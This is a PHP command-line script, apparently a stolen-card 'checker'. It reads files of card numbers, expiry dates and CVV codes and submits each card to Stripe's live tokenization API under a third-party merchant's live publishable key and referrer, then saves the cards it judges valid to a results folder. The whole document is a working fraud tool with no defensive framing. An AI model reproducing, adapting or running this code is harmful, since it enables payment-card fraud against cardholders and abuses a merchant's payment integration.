<?php
error_reporting(0);

$options = getopt(null, array(
      "dirName:",
      "dirResult:",
    ));
foreach ($options as $key => $value) {
   $$key = $value;
}

if(!empty($dirResult))mkdir($dirResult);
if(empty($dirName)){
  $dir = getcwd();
}else{
  $dir = $dirName."/";
}
$scandir = scandir($dir);
foreach($scandir as $file) {
  $ftype = filetype("$dir/$file");
  if($file != '..' && $file !='.'){
    $f = fopen($dirName."/".$file, "r");
    $start = false;
    while ($line = fgets($f, 1000)) {
      $arrayLine = explode(' : ', $line);
      $lineParams = $arrayLine[0];
      $lineValue = str_replace("\n","",$arrayLine[1]);
      $lineValue = str_replace("\r","",$lineValue);
      if(dropTrashString($lineParams) == "#Cardnumber")$cardNumber = dropTrashString($lineValue);
      if(dropTrashString($lineParams) == "#Expiration")$cardExpired = dropTrashString($lineValue);
      if(dropTrashString($lineParams) == "#CVV/CVV2")$cardCVC = dropTrashString($lineValue);
    }

      $arrayKartu = array(
        "cardNumber" => $cardNumber,
        "cardCVC" => $cardCVC,
        "cardExpired" => $cardExpired
      );

      $response =postKartu($arrayKartu);
      $decodeResponse = json_decode($response);
      if($decodeResponse->card->cvc_check == "unavailable"){
        file_put_contents($dirResult."/".$arrayKartu['cardNumber'].".txt",json_encode($arrayKartu));
        echo "Valid ".$arrayKartu['cardNumber']."  \n";
      }else{
        echo "Invalid ".$arrayKartu['cardNumber']." \n";
      }
  }
  $no++;
}









  function postKartu($dataCard){
          $cardNumber = $dataCard['cardNumber'];
          $cardCVC = $dataCard['cardCVC'];
          $arrayDate = explode("/",$dataCard['cardExpired']);
          $month = $arrayDate[0];
          $year = $arrayDate[1];
          $curl = curl_init();
          curl_setopt($curl, CURLOPT_HTTPHEADER, array(
              // 'Accept: /',
              // 'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ms;q=0.6',
              // 'Connection: keep-alive',
              // 'Set-Cookie: votes=4hrhs1c7%23yh3cf1dd; Path=/; Expires=Sat, 12-Aug-2028 09:31:35 GMT',
              'Content-Type: application/x-www-form-urlencoded',
              // 'Cookie: _ga=GA1.2.419174992.1533382676; _gid=GA1.2.897782525.1533382680; votes=4hrhs1c7; __atuuc=4330126%234347287; _gat_gtag_UA_91001217_1=1',
              // 'Host: strawpoll.com',
              'Origin: https://js.stripe.com',
              'Referer: https://js.stripe.com/v3/controller-b7d81dedeec3c3d419eaeb8fd94a299b.html',
              // 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36',
              // 'X-Requested-With: XMLHttpRequest',
          ));
          curl_setopt($curl,CURLOPT_URL, "https://api.stripe.com/v1/tokens");

          curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36");

          curl_setopt($curl, CURLOPT_POST, 1);
          curl_setopt($curl, CURLOPT_POSTFIELDS,"card[number]=$cardNumber&card[cvc]=$cardCVC&card[exp_month]=$month&card[exp_year]=$year&guid=2dcd7151-862b-4a71-9121-e8d98a52fc99&muid=fd18d74e-5e1b-4308-b5a4-b1d14d040224&sid=70512436-7714-4c71-a65f-d6949f89d54b&key=pk_live_pKUQzNAmMFumQBqzbE4xxQCy&pasted_fields=number&payment_user_agent=stripe.js%2F51cf2b85%3B+stripe-js-v3%2F51cf2b85&referrer=https://www.mullvad.net/en/account/stripe");
          curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
          $result = curl_exec($curl);
          return $result;
  }

  function dropTrashString($string){
    $string = str_replace(" ","",$string);
    $string = str_replace(" ","",$string);
    return $string;
  }
 ?>